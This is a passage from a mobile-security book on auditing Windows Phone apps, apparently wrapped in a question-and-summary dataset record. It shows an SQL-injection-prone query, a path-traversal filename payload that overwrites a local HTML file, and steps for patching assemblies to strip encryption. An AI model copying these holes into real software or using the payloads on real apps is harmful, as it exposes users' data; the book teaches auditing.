this.NavigationContext.QueryString[\"surname\"];\nSQLiteCommand cmd = db.CreateCommand(\n\"select * from Contacts where surname = '\" + attackerInput + \"'\");\nList<Contacts> stockList = cmd.ExecuteQuery<Contacts>();\n[ ... ]\n}\n}\nIn a real-world app, this method could be reached via a toast notification, for example, or via a protocol handler\nthat the app has registered.\nApps may also use data pulled in via HTTP API requests in insecure SQL query formation, as well.\nIt’s worth noting before we move on to another section that when you’re using SQLite’s Windows Phone engine\nand Krueger’s wrapper, stacked queries are not enabled, and the load_extension() function is disabled, so the\ninteresting exploitation techniques described here\n(https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet) are not applicable.\nAttacking File Handling\nAs with applications for any modern smartphone platform, apps running on Windows Phone 8.x may need to\nwrite files to disk, and then manipulate, read, and delete them.\nDevelopers occasionally make mistakes in handling file I/O, which can lead to some interesting security bugs.\nWe’ll talk about how file handling is done generally here, and then move on to discovering and possibly\nexploiting directory traversal bugs.\nIntroduction to File Handling\nSince the introduction of Windows Phone 8, the main APIs for dealing with file I/O are the Windows.Storage\nand Windows.Storage.Streams namespaces. You can find full documentation on both of these APIs at their\nrespective MSDN pages at http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/windows.storage.aspx and http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/windows.storage.streams.aspx.\nAs we’ve stressed a number of times before, third-party apps are subject to filesystem sandboxing restraints, and\nas such can read and write only from and to specific locations. Broadly, apps have read and write access to their\napplication data directory tree and read-only access to their install directory, which houses application binaries,\nthe manifest, and other assets. These directories reside at the following file paths:\nApplication data—C:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\...\nInstall directory—C:\\Data\\Programs\\{GUID}\\Install\\...\nThe majority of apps tend to use the folder named Local in their app data folder to store useful data. All files in\nthis directory (and other directories in their application data tree) are readable and writeable only by the app\nitself and the operating system.\nAn application can retrieve a StorageFolder instance for its local folder easily using the Windows.Storage API:\nStorageFolder myLocalFolder = ApplicationData.Current.LocalFolder;\nAn app can also retrieve the physical file path of its local folder, as well:\nstring localPath = StorageFolder localFolder =\nApplicationData.Current.LocalFolder;\nThe StorageFolder provides convenient APIs for creating new files and folders as shown here:\nStorageFolder myLocalFolder = ApplicationData.Current.LocalFolder;\n// create new folder called \"myFolder\", overwriting a previous\n// one if it existed\nStorageFolder newFolder = await myLocalFolder.CreateFolderAsync(\n\"myFolder\", CreationCollisionOption.ReplaceExisting);\n// now create a new file named \"myFile\" in the newly created folder\nStorageFile myNewFile = await newFolder.CreateFileAsync(\n\"myFile\", CreateCollisionOption.ReplaceExisting);\nAfter a StorageFile object exists for a created file, data can be written to it using an API such as DataWriter\nusing code like the following:\n// create new file\nStorageFile myFile = await newFolder.CreateFileAsync(\"myFile\",\nCreateCollisionOption.ReplaceExisting);\n// open with r/w access\nusing (IRandomAccessStream fileStream =\nawait myFile.OpenAsync(FileAccessMode.ReadWrite))\n{\nusing (DataWriter myDataWriter = new DataWriter(fileStream))\n{\n// write our data to the file\nmyDataWriter.WriteString(contents);\n// ensure contents are stored\nawait myDataWriter.StoreAsync();\n}\n}\nNote that the preceding CreateFileAsync() call specifies the ReplaceExisting enum; this tells the\nCreateFileAsync() method that an existing file with the same name should be overwritten. This is an important\nflag to bear in mind when auditing for potential file-handling bugs.\nAlternatively, if the file to be written to already existed, a StorageFile object to the file could instead be\nobtained using GetFileAsync() as opposed to CreateFileAsync():\nStorageFile myFile = await localFolder.GetFileAsync(\"myFile\");\nA file that already exists can similarly be opened to read data out from. For example, a developer could easily use\nthe DataReader class to read the entire contents of a file like this:\nStorageFolder localFolder = ApplicationData.Current.LocalFolder;\nStorageFile myFile = await localFolder.GetFileAsync(\"myFile\");\nstring fileContents;\nusing (IRandomAccessStream fileStream = await myFile.OpenReadAsync())\n{\nusing (DataReader dataReader = new DataReader(fileStream))\n{\nuint textLength = (uint)fileStream.Size;\nawait datareader.LoadAsync(textLength);\nfileContents = dataReader.ReadString(textLength);\n}\n}\nCode with a StorageFile object can delete the corresponding file using the DeleteAsync() method:\nawait myFile.DeleteAsync();\nOther useful miscellaneous APIs for handling are available, but the preceding covers the most basic patterns of\nfile I/O: file creation, file deletion, opening, reading, and writing.\nDirectory Traversal Attacks\nDirectory (or path) traversal vulnerabilities have been quite common in server applications over the years—\nparticularly web servers. Web apps have also been plagued with directory traversal bugs, and the consequences\nhave ranged from file disclosure to privilege escalation by overwriting important files.\nPath traversal vulnerabilities typically present themselves when filenames are attacker-influenced, and the app\nfails to prevent the use of “..” and “../” in the filename itself. This can represent a danger because “..” refers to\nthe directory one level back from the current directory.\nFor example, an app could want to save a file, and take a partial filename from an untrusted source. As a result\nof no sanitization of the filename, the full filename string could end up looking like this:\n[OMITTED]\\Local\\Images\\..\\traversed.jpg\nThe “..” portion of the filename would instruct the underlying API to place traversed.jpg in the Local folder,\ninstead of the current folder, Images, like the application developer had intended.\nConsider a hypothetical application used for managing affiliates that receives data about each of the company’s\naffiliates in JSON format (say, from a web service), and later uses this information for creating basic affiliate\nprofiles, which can later be viewed in the app.\nIn this case, the app receives JSON, as shown here for one of its clients, Acme Corp:\n{\n\"Company\": {\n\"Name\": \"Acme Inc\",\n\"ContactNumber\": \"111-222-3333\",\n\"CEO\": \"Joe Exec\",\n\"CTO\": \"John Techie\",\n\"COO\": \"James Operations\",\n\"Logo\": {\n\"URL\": \"http://www.acme.com/logo.jpg\",\n\"fileName\": \"acmeLogo.jpg\"\n}\n}\n}\nTo avoid regularly downloading all logo images for each affiliate for performance and offline usage reasons, the\napp parses the JSON structure for each affiliate company, and downloads the company’s logo file, saving it in an\nimages directory for later usage.\nTo avoid name clashes due to generic names like logo.jpg being used, the web service being called specifies a\nfilename to use for the image file, which was earlier specified by the affiliate in the Content Disposition request\nit used to upload the logo to the server-side web service. This idea seems quite logical, and after the logo image\nfile has been downloaded and loaded into a DataReader, the application attempts to save the file to its image\ndirectory in its sandboxed application data folder, Local\\AffiliateLogos. Assume the code looks like this:\n// download image file to a stream\nStream imageData = await DownloadAffiliateLogo(downloadUrl);\nstring fileName = getFilenameFromJson(affiliateData);\nStorageFolder myLocalFolder = ApplicationData.Current.LocalFolder;\n// open the folder where the logo files are stored\nStorageFolder imageFolder = await myLocalFolder.GetFolderAsync(\n\"AffiliateLogos\");\n// create new file with name supplied in json\nStorageFile imageFile = await imageFolder.CreateFileAsync(fileName,\nCreationCollisionOption.ReplaceExisting);\n// write the binary image data out to the new file\nusing (var photoOutputStream =\nawait imageFile.OpenStreamForWriteAsync())\n{\nawait imageData.CopyToAsync(photoOutputStream);\n}\nThis sort of code outline would work well, except that it does absolutely no sanitization of the filename string\nparsed out from the affiliate’s JSON data.\nWith a badly designed affiliate registration system in place, assume that a malicious affiliate’s JSON data ends\nup looking like this:\n{\n\"Company\": {\n\"Name\": \"Acme Inc\",\n\"ContactNumber\": \"111-222-3333\",\n\"CEO\": \"Joe Exec\",\n\"CTO\": \"John Techie\",\n\"COO\": \"James Operations\",\n\"Logo\": {\n\"URL\": \"http://www.acme.com/logo.jpg\",\n\"fileName\": \"..\\portal.html\"\n}\n}\n}\nIn trying to save the file to the app’s Local\\AffiliateLogos folder, the app would effectively call\nCreateFileAsync()like this:\nStorageFile imageFile = await imageFolder.CreateFileAsync(\n\"..\\portal.html\", CreationCollisionOption.ReplaceExisting);\nThis would result in the downloaded data being saved to the Local folder as portal.html, instead of in\nLocal\\AffiliateLogos like the developer had intended. Further, because CreateFileAsync()was called with the\nReplaceExisting enum, any file that existed in Local named portal.html will now have been overwritten with\nthe data that was just downloaded by the application.\nIn the context of this app, assume that the app at some earlier point had saved a page to Local\\portal.html that\nit uses for providing an interface in a WebBrowser control. In the hypothetical attack scenario we’ve laid out,\nthis HTML file has now been overwritten with attacker-controlled data.\nReferring to the earlier section, “Local Scripting Attacks,” you may recall that JavaScript executing in the local\norigin context is capable of file-stealing attacks, due to the code’s origin being the local filesystem itself. In a\nvulnerability scenario like this, a rogue affiliate would be in a position to steal sensitive and otherwise\ninteresting files from the device within the application’s sandboxing restrictions.\nApplications might also implement file I/O functionality which is vulnerable to path traversal attacks in other\nentry points that are reachable by would-be attackers, but the scenario presented in this section hopefully gives\na reasonable example of a potentially dangerous situation. The moral of the story is that potentially untrusted\ndata should not be used without sanitization for filenames, and certainly shouldn’t be allowed to contain “..”\npatterns.\nPatching .NET Assemblies\nSometimes during an assessment of a Windows Phone app you’ll need to apply patches to the app to gain\ngreater insight into how it works and what it’s doing internally with data. You might also need to remove\nsuperficial security controls such as screen lock password prompts and UI-based restrictions.\nIn these cases you can make modifications to the .NET assemblies to achieve your goal. Two very useful tools\nthat work in conjunction together are .NET reflector and Reflexil, both of which were mentioned briefly in\nChapter 10. .NET reflector is a general-purpose tool for converting a .NET assembly’s Common Intermediate\nLanguage (CIL) code to a form that is easily readable—usually C#.\nReflexil is a plug-in for .NET reflector that allows .NET assemblies to be modified and then saved with their new\npatches applied.\nYou can obtain both of these tools from their respective authors’ websites: .NET reflector at http://www.red-\ngate.com/products/dotnet-development/reflector/, and Reflexil at http://reflexil.net/.\nNote that you’ll only be able to patch applications that have been sideloaded, because those applications do not\nrequire valid signatures. Attempts to patch and then replace Original Equipment Manufacturer (OEM) apps will\nfail because modification of assemblies or binaries will invalidate their signatures. Modifying a binary or\nassembly, repackaging it into an XAP or APPX file, and then sideloading it is feasible, however.\nTo gain access to .NET binaries that are installed on your device, you obviously need full filesystem access to the\ndevice, which we discussed how to obtain in Chapter 10.\nEach application’s binaries are located at C:\\Data\\Programs\\{GUID}\\Install, where {GUID} is the app’s unique\nidentifier. In Windows Phone 8, assemblies will be DLL files, whereas in Windows 8.1 interesting binaries may\nbe DLL files and EXE files.\nAfter they’re patched using Reflexil or another tool, you can copy hacked assemblies back onto the device’s\nfilesystem and despite being modified, they will execute as expected.\nTo serve as an example, consider an application that stores data that originated from an Internet server speaking\nsome unknown binary protocol. The data has been parsed and processed into something useful to the app. At\nthis point, we know from the reversed C# code that the app stores the data in an AES-encrypted form in a file in\nits local folder. The key used to encrypt the data was derived from data that was received from the server via this\ncompletely unknown protocol.\nTo get the plaintext form of the data written to disk, reverse engineering the proprietary protocol that’s being\nused and studying how the app is parsing the data received presumably would be necessary in any case. This\nannoying and time-consuming obstacle is one most researchers could ideally do without.\nIn this sort of scenario, your first thought is to simply patch the application so that the parsed and processed\ndata is never encrypted in the first place, because this will give you what you want: the data in the file in its\nplaintext form.\nThrough initial inspection of the application in .NET reflector, there is an obviously named method that is\ndisassembled to the following:\npublic int EncryptAndSaveData(byte[] dataBlob, byte[] key)\n{\ndataBlob = this.EncryptBlob(dataBlob, key);\nthis.SaveDataBlob(dataBlob);\nreturn 0;\n}\nFigure 11.15 shows the output in .NET reflector.\nFigure 11.15 EncryptAndSaveData() in .NET reflector\nIt’s pretty clear what this code does. It appears to call EncryptBlob(), and then save the encrypted data by calling\nthe SaveDataBlob() method.\nIt’s quite evident from the recovered code that if the call to EncryptBlob() were simply removed and dataBlob\nwere just set to a reference of itself, then the interesting plaintext data would be saved to the file instead of\nencrypted data, which you want to avoid dealing with.\nThe next step to take in figuring out how you can indeed remove the call to EncryptBlob() involves taking a look\nat the CIL code that Reflexil nicely recovers for you. To do this, go to Tools, and click Reflexil. Figure 11.16\nshows the CIL that Reflexil has recovered.\nFigure 11.16 Reversed CIL code in .NET reflector and Reflexil\nThose familiar with assembly and other intermediate opcode languages (such as for Java) will probably notice\nthe CIL code’s similarity.\nYou can fairly easily tell which parts of the disassembly are what you are looking for due to informative method\nnames. Let’s analyze what’s going on in CIL opcode terms:\nOn line 02, ldarg.1loads the method argument at index 1 (dataBlob) onto the stack.\nOn line 03, ldarg.2 loads the method argument at index 2 (key) onto the stack.\nOn line 04, the EncryptBlob()function is called.\nThese first three lines are responsible for pushing dataBlob and key to the stack to act as arguments to\nEncryptBlob(), which is called on line 04. Note that the arguments are pushed in the logical order: dataBlob\nfirst, and key second—contrary to the way call stacks operate in many native environments.\nOn line 05, starg.s dataBlob tries to save the reference on top of the stack into dataBlob—that is, a\nreference to the encrypted data that is being returned by EncryptBlob().\nIt may quite correctly occur to you that if the EncryptBlob() call is somehow deleted and a reference to the\noriginal plaintext dataBlob contents is at the top of the stack, the instruction at line 05 will quite nicely set\ndataBlob to a reference of its own original contents; that is, dataBlob = dataBlob.\nTo do that, just get rid of the instruction that pushes key to the stack, and remove the call to EncryptBlob().\nThat way, the starg.s instruction on line 05 will simply set dataBlob with dataBlob (reference-wise)— that is to\nsay, ldarg.1 is the only push you’re interested in before the call.\nLet’s test out this theory. You don’t even need to insert NOP instructions. Reflexil allows you to simply delete\nunwanted instructions from the CIL disassembly. Right-click line 01 and click Delete, and then do the same for\nline 03 and line 04. (See Figure 11.17.)\nFigure 11.17 Deleting an instruction in Reflexil\nAfter deleting ldarg.0, ldarg.2, and call EncryptBlob(), you’re left with only the instructions you want; that is,\ndataBlob = dataBlob; SaveDataBlob(dataBlob);. (See Figure 11.18.)\nFigure 11.18 Modified CIL code after deleting instructions\nSave the changes you’ve made to the assembly by right-clicking on the left-hand side in the assembly explorer;\nin the Reflexil submenu, click Save As, and save the file with a unique filename. Right-click the assembly and\nclick Close Assembly.\nOpening the patched assembly, as shown in Figure 11.19, you can see whether the changes came out as you\nwanted them to.\nFigure 11.19 New disassembly for SaveAndEncryptData() after patching the method\nSuccess! The patched assembly now clearly bypasses the undesired crypto code path.\nIn patching exercises where you need to insert new instructions or edit existing instructions, you can access the\nEdit and Create New functions by right-clicking Reflexil’s CIL viewer. Each function provides a pull-down menu\nof instructions and also allows the user to type in instructions by hand. (See Figure 11.20.)\nFigure 11.20 Editing an existing instruction in Reflexil\nPatching .NET assemblies by hand can be quite tricky, given that you must consider stack states and other\naspects to avoid crashes.\nWhen methods are more complicated and keeping track of stack states and so on is proving difficult,\nalternatives exist to patching solely by hand. In fact, Reflexil has some support for patching assemblies with C#\ncode. That is, users can write code in C#, and Reflexil will compile it to CIL code to allow app patching.\nTo access this functionality right-click in Reflexil’s CIL display, and then click Replace All With Code.\nAt this point, you’ll be greeted by a C# code editor which will allow you to modify the app’s code. After you’re\ndone, click Compile, and assuming the compile goes well, clicking OK will exit the editor and patch the assembly\nwith the newly generated CIL code. You can save the hacked assembly as before. (See Figure 11.21.)\nFigure 11.21 Patching a method in C#\nAt this point, in the context of a real app, you would copy the modified assembly onto the device in place of the\noriginal (see Chapter 10) and rerun the app as normal, with its new modifications.\nThis hopefully serves as an example, and not an unrealistic one in many cases. More complex cases may require\nfurther study on CIL, its instructions, and what kind of operands each instruction expects. Detailed information\non CIL and its opcodes are available online, such as at this resource: http://www.codeproject\n.com/Articles/362076/Understanding-Common-Intermediate-Language-CIL.\nSummary\nThis chapter aimed to provide a general introduction to identifying vulnerabilities by code review and manual\ntesting in Windows Phone apps. When carrying out Windows Phone app reviews, the following will hopefully\nserve as a checklist for common vulnerability classes to check for:\nFirstly, analyze the application for interesting entry points, including IPC endpoints, network interactions,\nand interactions with other devices such as Bluetooth and NFC peers\nCheck for use of insecure (non-SSL/TLS) communications, and ensure that SSL sessions are properly\nprotected by the process of certificate trust chain validation\nCheck for vulnerability to HTML and JavaScript injection in WebBrowser and WebView components\nEnsure that JavaScript-C# interactions are safe and that components using data communicated to C# in this\nway do not make assumptions about the sanity of the data\nAnalyze the functionality of IPC-like interfaces—protocol handlers and file handlers—and ensure that their\nfunctionalities are securely implemented and cannot be abused or exploited by other apps or via web pages\nEnsure that the app does not have DTD parsing enabled such that the app could be vulnerable to file stealing\nand denial-of-service attacks due to entity expansion\nIf a SQLite or SQLite-derived database is used by the app, is the app vulnerable to SQL injection?\nCheck that file handling is implemented securely, and that directory traversal attacks are not possible",
    "question": "What are the potential security risks associated with the use of WebBrowser and WebView controls in Windows Phone applications, and how can attackers exploit these controls to inject malicious content or access sensitive data?",
    "summary": "Windows Phone apps can be vulnerable to various security issues, including insecure communication, HTML/JavaScript injection in WebBrowser and WebView controls, and improper handling of protocol and file handlers. These vulnerabilities can allow attackers to inject malicious content, access local files, or exploit XML parsing weaknesses. Additionally, apps may be susceptible to SQL injection if they use SQLite or similar databases. It is crucial to ensure that all communications use SSL/TLS, that JavaScript interactions are secure, and that file handling is properly restricted to prevent directory traversal and other attacks. Proper code review and manual testing are essential to identify and mitigate these risks."
  },
  {
    "start": 66,
    "end": 72,
    "text": "CHAPTER 12\nIdentifying Windows Phone Implementation Issues\nHaving explored identification and vulnerability testing for various application-level weaknesses in Windows\nPhone applications in Chapter 11, we’ll now look at common implementation issues that can also be culprits for\npresenting security problems in apps.\nYou can think of implementation issues as being somewhat general issues that developers should be aware of to\nbuild suitably secure apps.\nFor example, storage of sensitive data may be considered an implementation issue. Failure to store personally\nidentifiable information (PII) safely (that is, encrypted) could potentially have disastrous consequences for an\nindividual or an organization if a lost or stolen device came into the wrong hands; hence, implementing such\noperations in a secure manner is important.\nIn this chapter we delve into more generic problems that are common to Windows Phone, rather than attacking\nspecific pieces of an app’s functionality, as discussed in Chapter 11.\nIdentifying Insecure Application Settings Storage\nWindows Phone provides a standard interface for persisting custom settings and data that the application\ndeveloper deems appropriate to save for later use. This class is called IsolatedStorageSettings and can be\nviewed as being the Windows Phones’ equivalent of iOS’s NSUserDefaults and Android’s SharedPreferences\ninterfaces. You can find the MSDN documentation for IsolatedStorageSettings at\nhttp://msdn.microsoft.com/en-\nus/library/system.io.isolatedstorage.isolatedstoragesettings(v=vs.95).aspx.\nIsolatedStorageSettings provide a convenient way for apps to store data as key-value pairs to a file in their\nLocal folder. A typical use is to save settings relevant to the app, such as the number of images to display per\npage, the user’s login name, page layout options, and other app-related settings. The IsolatedStorageSettings\nclass essentially behaves as a thin layer wrapper around a dictionary object.\nAn application’s IsolatedStorageSettings instance is retrieved using the ApplicationSettings property, and if\nan instance doesn’t already exist, one is created accordingly.\nObjects are stored to IsolatedStorageSettings using either the Add method, or array notation, and objects are\nretrieved using TryGetValue()<T> or again, using array notation to dereference a value by its key.\nFor example, an application may store the hostname of a server it interacts with under a key named\nserverAddress, and the user’s username, using code similar to the following,\nIsolatedStorageSettings mySettings = IsolatedStorageSettings.\nApplicationSettings;\nmySettings.Add(\"serverAddress\", \"applicationServer.com\"); // using Add() method\nmySettings.Add(\"username\", usernameToSave); // using Add() method\nmySettings.Save();\nor:\nIsolatedStorageSettings mySettings =\nIsolatedStorageSettings.ApplicationSettings;\nmySettings[\"serverAddress\"] = (string)\"applicationServer.com\";\nmySettings[\"username\"] = (string)usernameToSave;\nmySettings.Save();\nNote that changes to the settings instance are committed by calling the Save() method.\nConversely, the stored server address may then be retrieved from the application’s settings storage, which in\nthis case is stored under a key called serverAddress, like so,\nIsolatedStorageSettings mySettings =\nIsolatedStorageSettings.ApplicationSettings;\nstring serverToConnectTo = (string)mySettings[\"serverAddress\"];\nor:\nIsolatedStorageSettings mySettings =\nIsolatedStorageSettings.ApplicationSettings;\nstring serverToConnectTo = null;\nbool success = mySettings.TryGetValue(\"serverAddress\", out serverToConnectTo);\nObjects that are currently stored in the app’s IsolatedStorageSettings dictionary can also be removed using the\nRemove() method, in the expected way:\nmySettings.Remove(\"serverAddress\");\nNote the mention of storing objects to IsolatedStorageSettings, as opposed to storing only strings and other\nsimple data types. Although many apps use only IsolatedStorageSettings to store useful settings and\nconfiguration values as strings, integers, and Boolean values, IsolatedStorageSettings is capable of storing\nmore complicated objects. Objects that a developer wants to store must, of course, be serializable.\nAfter settings (or in general, objects) are committed to the app’s IsolatedStorageSettings, the class serializes\nkey-value pairs to XML representations and saves the results to the filesystem, with any complex objects also\nbeing serialized to XML representations along the way.\nFor example, in keeping with the hypothetical situation just mentioned, where an app stored a hostname to\nIsolatedStorageSettings, the resulting file would include XML resembling the following:\n<Key>serverAddress</Key>\n<Value xmlns:d3p1=http://www.w3.org/2001/XMLSchema\ni:type=\"d3p1:string\">applicationServer.com</Value>\nAlthough this is merely an implementation detail, the IsolatedStorageSettings object and the objects it stores\nare serialized and conversely deserialized under the hood by the DataContractSerializer class.\nEach application’s IsolatedStorageSettings file is stored in its Local directory and is named\n__ApplicationSettings. More specifically, an app’s IsolatedStorageSettings file, if it has one, may be found at\nC:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\Local\\__ApplicationSettings, where {GUID} is the app’s GUID\nidentifier.\nWhen carrying out a security review of an application, extracting the __ApplicationSettings file from an app’s\nlocal storage (using your full filesystem access; see Chapter 10) and reviewing its contents for interesting\nmaterial is generally worth it, because Windows Phone developers use IsolatedStorageSettings frequently.\nThe IsolatedStorageSettings API does not encrypt key-value pair data in any way before storing it to the\nfilesystem, so developers should be aware that any sensitive data stored using this interface is not safe from\nattackers who have access to an app’s local storage sandbox. As such, you should consider sensitive data storage\nvia the IsolatedStorageSettings API to be a bug.\nA good example of sensitive data that developers unwittingly store to IsolatedStorageSettings (without\nconsidering the consequences in the event that the device is compromised) are authentication credentials.\nAlthough developers tend to store all manner of settings in their app’s IsolatedStorageSettings file, including\nsensitive information such as PII, finding sensitive credentials stored in __ApplicationSettings is also\ncommon.\nFor example, a developer who is perhaps less security-oriented may opt to store a set of login credentials that\npertain to the user’s account on the app’s backend API. Such code could resemble this:\nIsolatedStorageSettings mySettings =\nIsolatedStorageSettings.ApplicationSettings;\n[ ... ]\nmySettings.Add(\"serverAddress\", username);\nmySettings.Add(\"username\", username);\nmySettings.Add(\"password\", password);\nmySettings.Save();\nThe IsolatedStorageSettings API applies absolutely no encryption to these credentials, so they are prime and\neasy targets for theft by an attacker who manages to get access to the __ApplicationSettings file in the app’s\nLocal folder. Storing credentials and other sensitive settings in plaintext on the filesystem may be considered an\neven worse practice on the Windows Phone than on other mobile OSes (that is, Android or iOS), because whole-\ndevice encryption is only available to enterprise-connected users with RequireDeviceEncryption enabled in their\ncompany’s ActiveSync.\nFigure 12.1 shows an __ApplicationSettings file being accessed from a Windows Phone device’s filesystem,\nwith would-be important login credentials residing in the serialized file in plaintext.\nFigure 12.1 Accessing an __ApplicationSettings file on a device’s filesystem\nDuring security reviews of Windows Phone apps, you should ensure that apps are not storing credentials and\nother pieces of sensitive information unencrypted. It is a fairly common problem, though, given the simplicity of\nusing the IsolatedStorageSettings API, in much the same way iOS’s NSUserDefaults and Android’s\nSharedPreferences is also misused for insecure settings storage.\nIdentifying Data Leaks\nSome applications carry out actions that result in data being stored in ways not directly relevant to their\nfunctionality. For example, an app may use a WebBrowser control, which often leads to visited pages being cached\nto disk in the app’s sandboxed filesystem. In addition, visited pages may also store cookies. Both cookies and\nweb cache can include data that is sensitive in nature, so their storage may understandably be considered\nundesirable.\nApplications may also store logs at runtime, either for the purpose of error reporting (that is, telemetry to the\nvendor), or to aid the vendor during the app’s development process, or both. Some applications are guilty of\nlogging sensitive or otherwise useful information, sometimes including login credentials.\nYou can think of these three cases generally as data leaks. Storage of cookies and web cache by WebBrowser and\nWebView controls is implicit and not directly intended by the developer. The use of application logging is also not\ndirectly relevant to the operation of an app, but all of these have the potential to result in the disclosure of\nsensitive data to attackers.\nHTTP(S) Cookie Storage\nBecause WebBrowser and WebView controls provide a subset of full web browser functionality, it’s unsurprising\nthat they store cookies much like a full browser does.\nThe majority of Windows Phone apps we reviewed that feature WebBrowser or WebView controls don’t\nautomatically attempt to clear stored cookies after use.\nAssuming you (or a would-be attacker) has filesystem access to a Windows Phone device, checking whether or\nnot cookies are cleared is easy to do for any app. A WebBrowser or WebView control will automatically store\ncookies to the following location: C:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\INetCookies, where GUID is the\napplication’s GUID. The INetCookies directory is hidden by default, so you should type the full path into your\nfile manager rather than expect INetCookies to show up in its GUI interface.\nFigure 12.2 shows the inspection of stored cookies in the INetCookies directory. In applications where\nWebBrowser or WebView controls are hosting authenticated sessions, failure to deal with cookie deletion could\nrepresent a fairly serious security issue.\nFigure 12.2 Browsing an app’s INetCookies directory on a device\nUnless the device in question is enterprise-linked to an ActiveSync instance with RequireDeviceEncryption\nenabled, any cookies stored to the INetCookies directory are stored in the clear when the device is at rest.\nChapter 13 provides details on how to clear cookies in both the WebView and WebBrowser controls.\nHTTP(S) Caching\nWhen applications use WebBrowser or WebView controls to request remote web pages, it’s not uncommon for the\ncontrol to store cached copies of the web content to the app’s sandboxed directory structure.\nSome applications use WebView or WebBrowser controls to render important interfaces that offer a great deal of\ntheir functionality—sometimes in an authenticated context. Particularly in these cases, cached web content may\nwell contain sensitive information that was present in rendered pages, including HTML files, JavaScript files,\nand images.\nAs mentioned, cached content will be stored in plaintext on the filesystem (when the device is at rest) unless the\ndevice is enterprise-linked to an ActiveSync server with the RequireDeviceEncryption setting enabled.\nWebView and WebBrowser controls store their cache to the INetCache directory within the app’s filesystem\nsandbox. More specifically, replacing GUID with the actual GUID of the application in question, you can find\nany cache files stored by the app at C:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\INetCache. Note that the INetCache\nwill be a hidden directory, so you’ll have to navigate to the directory by typing its name into your file manager’s\naddress bar or equivalent.\nSee Chapter 13 for details on how to prevent caching by WebBrowser and WebView controls, so that sensitive\ncontent that has been rendered is not inadvertently left around in the app’s filesystem sandbox.\nApplication Logging\nWindows Phone 8.x includes the standard logging APIs, such as Debug.WriteLine(), but messages written using\nthis and related APIs are not stored to a log anywhere analogously to Android’s logcat, for example. If the app is\nnot being debugged (that is, via Visual Studio), the logging calls essentially have no effect.\nSome apps, however, may log to their Local directory, either via hand-rolled logging code, or via a known\nframework.\nA logging solution is available on MSDN at https://code.msdn.microsoft .com/windowsapps/A-logging-\nsolution-for-c407d880.\nTwo other free application logging frameworks are WPClogger (http://wpclogger .codeplex.com/) and Splunk\nMINT Express (https://mint.splunk.com/).\nWhen auditing applications, testers should examine calls to logging-style APIs and ensure that they are not\nlogging anything potentially sensitive to the filesystem, such as passwords and other credentials.\nIdentifying Insecure Data Storage\nSecure data storage on mobile devices is one of the most important aspects of mobile application security. A\nlarge number of applications for all mobile platforms need to store data, which is often sensitive, and should not\nbe easily handed over to a would-be attacker. Even so, developers still store data in unencrypted forms in\ndatabases, flat files, and other file storage formats.\nSuch insecure data storage is particularly concerning in the context of a sensitive mobile application, such as\none used for banking or one that deals with sensitive documents, and even more so given that data at rest on a\nWindows Phone device’s filesystem is by default unencrypted, unless the device is enterprise-linked to an\nActiveSync server with the RequireDeviceEncryption setting enabled.\nThis section discusses how you can identify instances of data storage by an application where data is being\nstored in plaintext format and is not being protected using cryptographic methods.\nThe standard interface for encrypting arbitrary data blobs on the Windows platforms is DPAPI, the Data\nProtection API. However, even this mechanism has its weaknesses, particularly in the context of Windows\nPhone devices. However, we’ll cover weaknesses in using DPAPI for data security in “Insecure Cryptography and\nPassword Use—Data Protection API Misuse on Windows Phone”.\nUnencrypted File Storage\nMany apps store data to files in their filesystem sandbox for later use. The reasons for storing data vary widely,\nbecause Windows Phone apps serve a multitude of purposes.\nSome apps that need to store data for later consumption deal with sensitive information, such as personally\nidentifiable information (PII). Naturally, such data needs to be protected from prying eyes to prevent\ninformation disclosure; for example, in the event of a lost and stolen device. This protection is particularly\nneeded for Windows Phone 8.x devices, which only have device encryption when they are enterprise-joined\n(despite having a screen unlock password).\nEven so, it’s still a common occurrence for Windows Phone apps to store data, often sensitive, in plaintext on\nthe filesystem.\nAlthough many mobile applications don’t actually deal with particularly sensitive information, many do; in fact,\nthe range of applications now available for all the popular mobile computing platforms is quite large; for\nexample, you can find apps for banking, betting, social networking, human resources management, document\nprocessing, emailing, and otherwise electronically communicating, just to name a few.\nA sample scenario could involve an HR management application. All things considered, it’s true to say that HR\nsoftware generally deals with information that is quite sensitive, spanning categories such as employee\ninformation, client information, payroll data, and even health-related information pertaining to particular\npeople. These categories are all data that no Chief Information Security Officer (CISO) would like to see make it\ninto the wrong hands.\nSuppose that a hypothetical HR app downloads a CSV file. This file is essentially a people directory for a\ncompany. The file contains full names, job titles, contact details, dates of births, and salary information for use\nby the app in carrying out its HR operative functions.\nEvery time the hypothetical application connects to the backend API and authenticates, it downloads the people\ndirectory CSV and saves it to the app’s Local folder. This is commonly done using HttpClient, WebClient, or\nanother web-related API.\nUsing the HttpClient class, the application could download a file and save it to its local storage using the\nIsolatedStorageFile and IsolatedStorageFileStream APIs, via code such as the following:\ntry\n{\nvar httpClient = new HttpClient();\nvar response = await httpClient.GetAsync(new\nUri(\"https://mobile.mycompany.com \"),\nHttpCompletionOption.ResponseHeadersRead);\nresponse.EnsureSuccessStatusCode();\nusing(var isolatedStorageFile =\nIsolatedStorageFile.GetUserStoreForApplication())\n{\nbool checkQuotaIncrease = IncreaseIsolatedStorageSpace(e.Result.Length);\nstring csvFile = \"employee_info.csv\";\nusing(var isolatedStorageFileStream =\nnew IsolatedStorageFileStream(csvFile,\nFileMode.Create, isolatedStorageFile))\n{\nusing(var stm = await response.Content.ReadAsStreamAsync())\n{\nstm.CopyTo(isolatedStorageFileStream);\n}\n}\n}\n}\ncatch(Exception)\n{\n// failed to download and store file..\n}\nAt this point, assuming the download and file I/O operations went as expected, the CSV file in question would\nreside in the app’s Local folder under the name employee_info.csv. It would be ready for processing and use in\nthe app’s normal functionality.\nNotice that after the CSV data is downloaded; no cryptography is carried out on the file before it is saved to disk.\nUnfortunately, storing a sensitive file is where many apps stop, leaving the file on the filesystem in its\nunencrypted form; many apps make no effort to apply any encryption on their sensitive files at all.\nIt may be that many unsuspecting mobile developers assume that because files are in the app’s sandbox, they\nare generally safe from theft in their unencrypted form. Furthermore, there seems to be the expectation that\nmost devices are surely encrypted in some standard, secure way to provide privacy if a device is lost or stolen.\nSuch assumptions may be correct in that, normally, third-party apps on a device are not supposed to be able to\nreach into other apps’ sandboxes and steal files.\nHowever, as previously mentioned, Windows Phone devices that are not enterprise-enrolled do not have 